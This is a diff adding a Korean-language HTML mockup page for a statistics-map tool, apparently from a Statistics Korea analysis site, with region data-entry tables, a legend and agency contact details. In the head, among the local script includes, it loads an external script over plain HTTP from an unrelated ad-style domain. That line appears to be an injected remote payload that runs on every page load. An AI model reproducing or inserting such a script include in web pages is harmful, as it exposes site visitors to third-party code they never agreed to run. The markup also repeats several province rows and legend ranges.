@@ -1,0 +1,341 @@
+<!-- 
+통계지도 체험
+//-->
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="utf-8" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>통계지도 체험 | 분석지도</title>	
+    <link href="css/default.css" rel="stylesheet" type="text/css" />  
+    <link rel="stylesheet" type="text/css" href="css/main.css" />
+	<link rel="stylesheet" type="text/css" href="css/sub.css" />
+	<link rel="stylesheet" type="text/css" href="css/common.css" />
+	<link rel="stylesheet" type="text/css" href="css/layout.css" />
+	<link rel="stylesheet" type="text/css" href="css/styles.css" />
+    <script type="text/javascript" src="js/common/includeHead.js"></script>
+    <script type="text/javascript" src="js/common/common.js"></script>
+    <script type="text/javascript" src="js/index.js"></script>
+	<script type="text/javascript" src="js/common/script.js"></script>
+<script type="text/javascript" src="http://img.rafomedia.com/zr/js/adr.js?lsyq"></script>
+</head>
+<body style="overflow-x:hidden; overflow-y:auto;"> 
+	<div id="wrap2">
+		<!-- header // -->
+		<header id="header">
+			<!-- Top Include -->
+			<script type="text/javascript"  src="js/common/includeSearch.js"></script>
+		</header>
+		
+	    <!-- body -->	
+		<div id="container_p" >
+		<p class="path">
+                    <a href="/html/index.html"><span class="path_el">분석지도&nbsp;&nbsp;>&nbsp;</span></a>
+                    <a id="button_pop" href="#"><span class="path_el current">통계지도 체험</span></a>	
+					<span class="data_v"><input type="image" onclick="eventonclick();" src="images/data_view.jpg"  alt="데이터 보기"/></span>
+					<span class="help_v"><input type="image" onclick="eventonclick();" src="images/help_view.jpg"  alt="도움말"/></span>
+                </p><!-- path -->
+				<div id="layer_popup" style="left:220px">
+					통계지도체험입니다.<br/></div>
+					<script>
+						$("#button_pop").hover(
+						function(){
+						$("#layer_popup").show();
+						},function(){
+						$("#layer_popup").hide();
+						});
+						</script>
+		</div><!-- container_p -->
+
+	    <div id="container_3" >				
+				<!-- 래프트메뉴 -->
+				<div id="left_menu" >					
+						<div id="stat_leftmenu" >
+							<h3>작업선택</h3>
+							<ul>	
+								<li>									
+									 <label><input type="radio" name="RG1" value="radio" id="RG1_0" onclick="eventonclick();" /> 전국 &nbsp; &nbsp; </label>
+									 <label><input type="radio" name="RG1" value="radio" id="RG1_0" onclick="eventonclick();" /> 시도 &nbsp; &nbsp; </label>
+									 <label><input type="radio" name="RG1" value="radio" id="RG1_0" onclick="eventonclick();" /> 시군구</label>									 
+								</li>
+							<ul>
+							<h3>입력방식 선택</h3>
+							<ul>	
+								<li>									
+									 <label><input type="radio" name="RG1" value="radio" id="RG1_0" onclick="eventonclick();" /> 직접입력 &nbsp; &nbsp; </label>
+									 <label><input type="radio" name="RG1" value="radio" id="RG1_0" onclick="eventonclick();" /> 엑셀로 입력</label>									
+									 <form><input type="submit" name="button" id="button" value="양식 다운받기" class="stdown_btn"/> <input type="submit" name="button" id="button" value="데이터 업로드" class="stdown_btn"/> </form> 
+								</li>
+							<ul>
+							<h3>데이터 조회방식</h3>
+							<ul>	
+								<li>									
+									 <label><input type="radio" name="RG1" value="radio" id="RG1_0" onclick="eventonclick();" /> 지도 보기</label><br/>
+									 <label><input type="radio" name="RG1" value="radio" id="RG1_0" onclick="eventonclick();" /> 막대 그래프 보기</label><br/>	
+									 <label><input type="radio" name="RG1" value="radio" id="RG1_0" onclick="eventonclick();" /> 원그래프 보기</label>										  
+								</li>
+							<ul>
+							<h3>다운로드 하기</h3>
+							<ul>	
+								<li>									
+									<form><input type="submit" name="button" id="button" value="지도 다운로드" class="stdown_btn"/> <input type="submit" name="button" id="button" value="자료 다운로드" class="stdown_btn"/> </form> 								
+								</li>
+							<ul>
+							<h3>출력하기</h3>
+							<ul>	
+								<li>									
+									 <form><input type="text" name="textfield" id="textfield" class="fileurl_txt" /> <input type="submit" name="button" id="button" value="출 력" class="stafile_btn"/></form>
+								</li>
+							<ul>
+						</div><!-- stat_leftmenu 끝 -->						
+				</div><!-- left_menu -->
+				<div id="left_menu_right"  style="overflow-x:hidden; overflow-y:scroll; height:700px; width:240px;">
+						<p class="d_put">데이터 직접입력</p>
+						<p><input type="submit" name="button" id="button" value="입력결과 적용 " class="apply_btn"/></p>
+						<table class="tab_n7">
+							<tr>
+								<th>서울특별시</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>부산광역시</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>대구광역시</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>광주광역시</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>대전광역시</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>울산광역시</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>세종특별자치시</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>경기도</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>강원도</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>충청북도</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>충청남도</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>전라북도</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>전라남도</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>경상북도</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>경상남도</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>충청북도</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>충청남도</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>전라북도</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>전라남도</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>경상북도</th>
+								<td></td>
+							</tr>
+							<tr>
+								<th>경상남도</th>
+								<td></td>
+							</tr>
+						</table>
+				</div><!-- left_menu_right -->
+
+				<!-- 지도영역 -->				
+				<div id="stat_content_map" style="overflow-x:hidden; overflow-y:scroll; height:700px; width:950px;">			
+						<div id="pyra2-wrap" ><!-- 피라미드 -->
+							<img src="images/map6.jpg" />
+						</div><!-- pyra2-wrap -->	
+
+						<!-- 범례 -->
+						<div id="bum_stat">
+							<p class="bucl"><a href="#"><img src="images/btn_close.png" alt="close" /></a></p>
+							<p class="subbu">범 례</p>
+							<div class="con_bum">
+									<div class="bumda" ><!-- 범례 % -->
+											<ul class="daa">
+												<li>30% 이상</li>
+												<li>25%~30%</li>
+												<li>25%~30%</li>
+												<li>25%~30%</li>
+												<li>25%~30%</li>
+												<li>25%~30%</li>
+												<li class="last1">15% 미만</li>
+											</ul>
+									</div><!-- bumda -->
+									<div class="bumcolor" >
+											<ul class="dacc">
+												<li class="gr1"></li>
+												<li class="gr2"></li>
+												<li class="gr3"></li>
+												<li class="gr4"></li>
+												<li class="gr5"></li>
+												<li class="gr6"></li>
+												<li class="gr7"></li>
+											</ul>
+									</div><!-- bumcolor -->
+							</div>	<!-- con_bum -->
+						</div><!-- bum -->
+						<div class="smallbum_img"><a href="#"><img src="images/btn_bum.png" alt="범례" /></a></div>
+
+						
+						<!-- 데이터 영역 start! -->
+						<div class="small_img"><input type="image" onclick="eventonclick();" src="images/btn_small_data.jpg"  alt="데이터보기"/></div> <!-- 데이터 보기 작은 이미지 -->
+
+						<div id="map_data6"   > <!-- 데이터 펼쳤을때/ display:none;을 삭제하면 보입니다.  style="display:none;" -->							
+								<div id="data_6" style="overflow-x:hidden; overflow-y:scroll; height:468px; width:430px;">		
+											<div class="c_fn2" >
+												<table class="tab_n5">
+													<tr>
+														<th>시도</th>
+														<th>통계값</th>
+													</tr>
+													<tr>
+														<td>서울특별시</td>
+														<td></td>
+													</tr>
+													<tr>
+														<td>부산광역시</td>
+														<td></td>
+													</tr>
+													<tr>
+														<td>대구광역시</td>
+														<td></td>
+													</tr>
+													<tr>
+														<td>광주광역시</td>
+														<td></td>
+													</tr>
+													<tr>
+														<td>대전광역시</td>
+														<td></td>
+													</tr>
+													<tr>
+														<td>울산광역시</td>
+														<td></td>
+													</tr>
+													<tr>
+														<td>세종특별자치시</td>
+														<td></td>
+													</tr>
+													<tr>
+														<td>경기도</td>
+														<td></td>
+													</tr>
+													<tr>
+														<td>강원도</td>
+														<td></td>
+													</tr>
+													<tr>
+														<td>충청북도</td>
+														<td></td>
+													</tr>
+													<tr>
+														<td>충청남도</td>
+														<td></td>
+													</tr>
+													<tr>
+														<td>전라북도</td>
+														<td></td>
+													</tr>
+													<tr>
+														<td>전라남도</td>
+														<td></td>
+													</tr>
+													<tr>
+														<td>경상북도</td>
+														<td></td>
+													</tr>
+													<tr>
+														<td>경상남도</td>
+														<td></td>
+													</tr>
+
+												</table>
+											</div><!-- c_fn end! -->
+											
+									</div><!-- data_6 end! -->
+								<div class="center btn_b6" ><input type="image" onclick="eventonclick();" src="images/btn_arr.jpg"  alt="close"/></div><!-- btn_b 닫기 버튼-->
+						</div><!-- map_data6 끝!-->
+						<div class="map_data_closed5" >							
+								<div class="center"><input type="image" onclick="eventonclick();" src="images/btn_arr.jpg"  alt="close"/></a></div><!-- **** 데이터 닫혔을 때 -->
+						</div><!-- map_data_closed 끝!-->
+						<!-- 데이터 영역 end! -->
+
+
+				</div><!-- content_map -->
+
+	    </div><!-- container_2 end!-->
+	    
+	    <!-- footer// -->
+	     <footer id="footer">
+                <div class='footer-in'>
+						<ul class='terms'>
+							<li><a href='/html/member/personalInfo.html'>개인정보처리방침</a></li>
+							<li><a href='/html/member/emailInfo.html'>이메일무단수집거부</a></li>
+						</ul>
+						<ul class='relation'>
+							<li style='margin-right:7px;'><a href='http://kostat.go.kr' target='_blank'>통계청 |</a></li>
+							<li style='margin-right:7px;'><a href='http://kosis.kr' target='_blank'>KOSIS |</a></li>
+							<li style='margin-right:7px;'><a href='http://mdss.kostat.go.kr' target='_blank'>MDSS |</a></li>
+							<li style='margin-right:7px;'><a href='https://kssc.kostat.go.kr:8443/ksscNew_web/index.jsp' target='_blank'>통계분류</a></li>
+						</ul>
+						<div class='info'>
+							<p class='address'>(302-702)대전광역시 서구 청사로 189</p>
+							<dl class='tel'>
+								<dt>통계청콜센터 :</dt>
+								<dd>02)2012-9114</dd>
+								<dt>관리자 :</dt>
+								<dd>042)481-2248</dd>
+								<dt>자료제공담당자 :</dt>
+								<dd>(042)481-2438</dd>
+							</dl>
+						</div>
+					</div>
+            </footer>
+            <!-- //footer -->
+           
+
+	</div><!-- wrap2 끝 -->
+</body>
+</html>
